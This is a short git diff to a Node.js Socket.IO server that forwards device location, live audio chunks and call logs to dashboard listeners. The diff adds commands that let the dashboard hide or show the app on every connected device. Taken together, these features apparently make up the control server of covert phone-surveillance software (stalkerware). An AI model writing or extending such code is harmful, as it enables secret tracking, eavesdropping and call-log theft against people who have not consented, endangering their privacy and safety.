@@ -33,6 +33,19 @@ io.on("connection", (socket) => {
     console.log(`🖥️ Listener registered: ${socket.id}`);
   });
 
+  // ---------------- HIDE/SHOW APP FEATURE ----------------
+  // Dashboard -> Device
+  socket.on("hide-app", () => {
+    console.log("👻 Hide app command sent");
+    devices.forEach((id) => io.to(id).emit("hide-app"));
+  });
+
+  socket.on("show-app", () => {
+    console.log("📲 Show app command sent");
+    devices.forEach((id) => io.to(id).emit("show-app"));
+  });
+  // -------------------------------------------------------
+
   // Forward location updates
   socket.on("location-update", (data) => {
     console.log(`📍 Location from ${socket.id}:`, data);
@@ -45,7 +58,7 @@ io.on("connection", (socket) => {
     listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
   });
 
-  // Forward call logs (optional periodic batch)
+  // Forward call logs
   socket.on("call-logs", (logs) => {
     console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
     listeners.forEach((id) => io.to(id).emit("call-logs", logs));
